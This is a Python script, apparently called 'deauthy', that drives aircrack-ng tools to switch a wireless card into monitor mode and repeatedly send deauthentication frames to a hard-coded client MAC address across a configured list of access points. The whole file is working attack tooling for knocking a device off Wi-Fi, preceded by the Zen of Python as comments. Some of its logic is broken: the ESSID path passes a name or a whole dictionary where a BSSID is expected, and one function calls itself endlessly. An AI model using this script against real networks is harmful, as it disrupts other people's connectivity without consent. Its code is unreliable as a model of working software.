import os
import random

# Beautiful is better than ugly.
# Explicit is better than implicit.
# Simple is better than complex.
# Complex is better than complicated.
# Flat is better than nested.
# Sparse is better than dense.
# Readability counts.
# Special cases aren't special enough to break the rules.
# Although practicality beats purity.
# Errors should never pass silently.
# Unless explicitly silenced.
# In the face of ambiguity, refuse the temptation to guess.
# There should be one-- and preferably only one --obvious way to do it.
# Although that way may not be obvious at first unless you're Dutch.
# Now is better than never.
# Although never is often better than *right* now.
# If the implementation is hard to explain, it's a bad idea.
# If the implementation is easy to explain, it may be a good idea.
# Namespaces are one honking great idea -- let's do more of those!

# config here
class Config:
    iface_no_mon = "wlo1"
    iface_mon = "wlo1mon"
    ESSID = {"Internet":11} # <ESSID>:<It's channel>
    BSSIDs = {
        "28:C7:CE:4E:AF:B0":1,  # <BSSID>:<It's channel>
        "28:c7:ce:4e:af:bf":1,  # <BSSID>:<It's channel>
        "50:1C:BF:E2:DE:F0":11, # <BSSID>:<It's channel>
        "28:C7:CE:4F:06:C0":1,  # <BSSID>:<It's channel>
        "28:C7:CE:4F:04:F0":6,  # <BSSID>:<It's channel>
        } 
    STATION = "8C:F5:A3:38:CC:73" # aka client mac address, the device you wish to deauthenticate

class deauthy:
    """Main class for the methods"""
    class BSSID:
        def deauth(bSSID: str):
            """"""
            channel = Config.BSSIDs[bSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                os.system(f"aireplay-ng -0 5 -a {bSSID} -c {Config.STATION} {Config.iface_mon}")
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch("managed")
                return
    class ESSID:
        def deauth(eSSID: str):
            """"""
            channel = Config.ESSID[eSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                os.system(f"aireplay-ng -0 5 -a {eSSID} -c {Config.STATION} {Config.iface_mon}")
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch("managed")
                return

    class ChannelSys:
        def hopper(channel_number: int):
            """Hop to a different channel"""
            os.system(f"airmon-ng start {Config.iface_no_mon}mon {channel_number}")

    class InterfaceMode:
        def switch(mode: str):
            """
            Accepts either "monitor" or "managed"
            """
            def managed():
                os.system(f"airmon-ng stop {Config.iface_no_mon}mon")
            def monitor():
                os.system(f"airmon-ng start {Config.iface_no_mon}")
            modes = {
                "managed":managed,
                "monitor":monitor,
            }
            try:
                modes[mode]()
            except KeyError:
                raise RuntimeError("That's not a valid interface mode.")

def main():
    def do_bssid_method():
        for bssid, channel in Config.BSSIDs.items():
            deauthy.BSSID.deauth(bssid)
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch("managed")
            return

    deauthy.InterfaceMode.switch("monitor")
    method = input("Use given ESSID or the list of BSSIDs (BSSID / ESSID)> ")
    if method == "BSSID":
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch("managed")
            return
    if method == "ESSID":
        deauthy.ESSID.deauth(Config.ESSID)
        return

try:
    main()
except KeyboardInterrupt:
    deauthy.InterfaceMode.switch("managed")